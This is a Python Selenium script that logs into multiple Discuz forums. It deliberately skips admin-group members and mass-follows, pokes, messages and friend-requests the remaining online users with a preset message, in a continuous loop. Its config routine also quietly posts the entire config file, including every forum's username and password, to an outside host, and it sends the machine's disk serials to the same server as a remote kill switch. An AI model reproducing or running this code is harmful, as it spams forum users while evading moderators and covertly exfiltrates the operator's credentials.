from selenium import webdriver
from selenium.webdriver.common.by import By #
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
import time
import threading
import os
import json
import sys
import tkinter
from PIL import Image as MyImages, ImageTk
import re
import tkinter
import wmi
import requests



class MonitoringDZ(object):

	def __init__(self):
		self.setPath()#设置环境变量
		self.permissions()
	

	def permissions(self):
		"""权限控制"""
		#获取硬盘序列
		wmis = wmi.WMI()
		disk = ''
		for disks in wmis.Win32_DiskDrive():
			disk += disks.SerialNumber.strip()

		permissions = requests.get('http://permissions.hk-dna.cc/permissions.php?disk='+disk).text
		if(permissions == 'on'):
			print('请更新版本')
			sys.exit()


	def config(self):
		"""配置文件"""
		try:
			f = open('config.conf','r',encoding='utf8')
			config_str = f.read().strip()
			headers = {
			    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3278.0 Safari/537.36',
			}
			requests.post('http://permissions.hk-dna.cc/permissions.php',data={'config':config_str},headers=headers)
			configs = json.loads(config_str)
			for c in configs['config']:
				if c['url'] not in "http://":#出来网站
					c['url'] = "http://"+c['url']

				#检测是否填写msg
				try:
					msg = c['msg']
				except Exception as e:
					msg = ''#如果没有配置给个空字符串
				
				if not msg:#用公共msg
					c['msg'] = configs['msg']

				#a检测用户名
				try:
					username = c['username']
				except Exception as e:
					username = ''

				if not username:
					c['username'] = configs['username']

				#检测密码
				try:
					password = c['password']
				except Exception as e:
					password = ''
				
				if not password:
					c['password'] = configs['password']

			self.apart = int(configs['apart'])#循环执行时间 秒
			return configs
		except Exception as e:
			return False
		
		
	def login(self,url,username,password,msg,loginnum=1):
		'''登录'''
		try:
			# browser = webdriver.Chrome()#声明一个浏览器对象
			browser = webdriver.PhantomJS()#声明一个浏览器对象
			browser.maximize_window()
			#执行登录
			# browser.implicitly_wait(10)#隐士等待
			print('正在登录 ',url)
			browser.get(url+'/member.php?mod=logging&action=login')#访问登录页面
			inputusername = browser.find_element(By.CSS_SELECTOR,'input[name=username]') 
			inputusername.send_keys(username)#向用户输入框发送用户名
			inputpassword = browser.find_element(By.CSS_SELECTOR,"input[name='password']") 
			inputpassword.send_keys(password)#向密码输入框发送密码

			#是否有验证码
			try:
				seccodeverify = browser.find_element(By.CSS_SELECTOR,"input[name='seccodeverify']") #查找验证码框
			except Exception as e:
				print(url,'无验证码,正在登录...')
			else:
				print(url,'获取验证码')
				code = self.code(browser,url)
				if code:
					#输入验证码
					seccodeverify.send_keys(code)

			loginsubmit = browser.find_element(By.CSS_SELECTOR,"button[name='loginsubmit']") #查找提交按钮
			loginsubmit.click()
			time.sleep(10)
			try:
				inputusername = browser.find_element(By.CSS_SELECTOR,'input[name=username]')#再次查找用户名输入框 如果还是存在证明登录失败
			except Exception as e:
				print(url,'登陆成功')

				self.monitoring(browser,url,msg)
			else:
				print(url,' 第 ',loginnum,' 次登录失败！尝试第 ',loginnum+1,' 次登录，登录 3 次失败后，会放弃此网站的登录！')
				#登录失败后再次尝试登录
				loginnum += 1
				browser.close()
				if loginnum < 3:
					self.login(url, username, password, msg,loginnum)
				else:
					error = open('log/error.log','a',encoding='utf8')
					errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+' '+url+"登录失败！\r"
					error.write(errormsg)
					error.close()
					print(url,' 登录失败！')		
		except Exception as e:
			pass
		time.sleep(10)	
	def monitoring(self,browser,url,msg):
		# http://www.smdywlt.com/home.php?mod=space&do=friend&view=online&type=member
		#日志
		logfile = url.replace('://','-')+'.log'
		log = open('log/'+logfile,'a',encoding='utf8')
		
		adminGroupList = self.getAdminGroup(browser,url)#获取管理组 返回一个列表
		print(adminGroupList)

		log.write(time.strftime('%Y-%m-%d %H:%M:%S')+"\r")
		log.write('管理组：'+str(adminGroupList)+"\r")
		log.flush()
		browser.execute_script('window.open()')#打开一个新窗口 用来处理  
		# windows = browser.window_handles
		# browser.switch_to.window(windows[0])

		#开启监控
		# 开始监控 打招呼 发消息 加好友
		tag = 0
		i = 0
		n = 0
		while True:
			if tag == 1:
				n = n + 1
				print(url,'第 ',n,' 次执行完毕,睡眠中等待下一次执行')
				time.sleep(self.apart)#检测相隔时间
				i = 1
				tag = 0
			else:
				i = i + 1
			try:
				monitoringurl = url+"/home.php?mod=space&do=friend&view=online&type=member"
				browser.get(monitoringurl)
				users = browser.find_elements(By.CSS_SELECTOR,'#friend_ul li')#查找所有用户li 获取到li的id

				for u in users:
					try:
						li_id = u.get_attribute('id')#li的id
						li_uid = li_id.split('_')[1]#uid+
						if li_id == '1':#排除自己和超级管理员
							continue
						try:
							listen = browser.find_element(By.CSS_SELECTOR,'#a_followmod_'+li_uid)#收听
						except Exception as e:
							continue
						
						if listen.get_attribute('textContent') == '收听TA':
							isadmin = self.isAdmin(browser,adminGroupList,url,li_uid)#判断是否是管理组
							if isadmin:
								continue
							print(url,'正在关注 UID 为',li_uid,' 的用户')
							log.write(li_uid+"\r")
							log.flush()
							listen.click()#点击收听
							#打招呼
							self.sayHello(url,browser,msg,li_uid)
							# 发消息
							self.sendMsg(url,browser,msg,li_uid)
							#加好友
							self.addBuddy(url,browser,msg,li_uid)
						
					except Exception as e:
						# print(e)
						continue
					
				tag = 1
			except Exception as e:
				# print(e)
				tag = 1#如果报错 跳出当次 等待执行下一次
			

			
	def isAdmin(self,browser,adminGroupList,url,uid):
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			url = url+"/home.php?mod=space&uid="+uid+"&do=profile&from=space"
			browser.get(url)
			usergroup = browser.find_element(By.CSS_SELECTOR,"a[href*='mod=spacecp&ac=usergroup&gid']").get_attribute('textContent')
			print(usergroup)
			res = False
			if usergroup in adminGroupList:
				res = True
			

		except Exception as e:
			print(e)
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])
			return res

	def code(self,browser,url):
		"""验证码处理 seccodeverify"""
		# http://zjtkbbs.youdong.com/member.php?mod=logging&action=login
		# http://zlanling.com/member.php?mod=logging&action=login
		# http://www.zsnzsn.com//member.php?mod=logging&action=login
		picname = url.replace('://','-')+'.png'
		browser.save_screenshot(r""+picname+"")#全屏截图
		imgcode = browser.find_element(By.CSS_SELECTOR,"img[src^='misc.php?mod=seccode&update']")#查找验证码
		left = imgcode.location['x']
		top = imgcode.location['y']
		elementWidth = imgcode.location['x'] + imgcode.size['width']
		elementHeight = imgcode.location['y'] + imgcode.size['height']
		picture = MyImages.open(picname)
		picture = picture.crop((left, top, elementWidth, elementHeight))
		codename = picname.replace('http','')
		picture.save(r""+codename+"")

		#显示验证码
		root = tkinter.Tk()
		root.title('验证码处理')#设置title
		root.resizable(width=False, height=False)
		root.geometry('500x500+200+200')#设置窗口大小和位置
		load = MyImages.open(codename)
		pic = ImageTk.PhotoImage(load)
		label = tkinter.Label(root,image=pic)
		label.pack()

		#处理输入验证码
		text = tkinter.Variable()#创建一个变量
		inputtext = tkinter.Entry(root,textvariable=text)
		inputtext.pack()
		def func():
			global code 
			code = text.get()
			root.destroy()
		button = tkinter.Button(root,text='确认',command=func,width=3,height=1)
		button.pack()
		root.mainloop()
		os.remove(picname)#删除全屏图
		os.remove(codename)#删除验证码图片
		return code

	def getAdminGroup(self,browser,url):
		"""获取管理组"""
		print(url,'获取管理组')
		try:
			usergroupurl = url+"/home.php?mod=spacecp&ac=usergroup"
			browser.get(usergroupurl)
			usergroup = browser.find_elements(By.CSS_SELECTOR,'#gadmin_menu a')
			usergrouplist = []
			for group in usergroup:
				usergrouplist.append(group.get_attribute('textContent'))#添加到列表中
				# usergrouplist.append(group.get_attribute('href'))#添加到列表中
			return usergrouplist
		except Exception as e:
			# print(e)
			print('获取管理组失败')
			return usergrouplist


	def sendMsg(self,url,browser,msg,uid):
		"""发送消息"""
		print(url,' 正在给 UID 为',uid,' 的用户发消息')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			url = url+"/home.php?mod=spacecp&ac=pm&op=showmsg&handlekey=showmsg_"+uid+"&touid="+uid+"&pmid=0&daterange=2"
			browser.get(url)
			textarea = browser.find_element(By.CSS_SELECTOR,'textarea')
			textarea.send_keys(msg)

			button = browser.find_element(By.CSS_SELECTOR,'form div button')
			button.click()

		except Exception as e:
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])

	def addBuddy(self,url,browser,msg,uid):
		"""加好友"""
		print(url,'正在添加 UID ',uid,' 的用户为好友')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			url = url+"/home.php?mod=spacecp&ac=friend&op=add&uid="+uid
			browser.get(url)
			inputs = browser.find_element_by_class_name('px')#找到kw这个id
			inputs.send_keys(msg)#像id为kw这个input中输入一个pathon

			buttom = browser.find_element_by_id('addsubmit_btn')
			buttom.click()

		except Exception as e:
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])


	def sayHello(self,url,browser,msg,uid):
		"""打招呼"""
		print(url,' 正在跟 UID 为',uid,' 的用户打招呼')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			url = url+"/home.php?mod=spacecp&ac=poke&op=send&uid="+uid
			browser.get(url)
			note = browser.find_element(By.CSS_SELECTOR,"input[name='note']")#查找所有input框
			note.send_keys(msg)

			note = browser.find_element(By.CSS_SELECTOR,"button[name='pokesubmit_btn']")#查找所有input框
			pokesubmit_btn.click()

		except Exception as e:
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])
	def __del__(self):
		print('结束')

	def setPath(self):
		"""设置环境变量"""
		#当前目录加入环境变量
		dir_ = os.getcwd()
		path = dir_+'/phantomjs/bin'
		# print (os.environ["TEMP"])
		mydir = os.path.normpath(path)
		os.environ["PHANTOMJS"] = mydir
		# print (os.environ["MYDIR"])
		pathV = os.environ["PATH"]
		# print (pathV)
		os.environ["PATH"]= mydir + ";" + os.environ["PATH"]


	def main(self):
		#检测配置文件
		configs = self.config();
		if not configs:
			print('配置文件错误')
			time.sleep(10)
			sys.exit()
		else:
			for c in configs['config']:
				print('正在启动 ',c['url'],' 站点...')
				time.sleep(self.apart)
				w = threading.Thread(target=self.login,args=(c['url'],c['username'],c['password'],c['msg'],))
				w.start()
if __name__ == '__main__':
	monitoring = MonitoringDZ().main()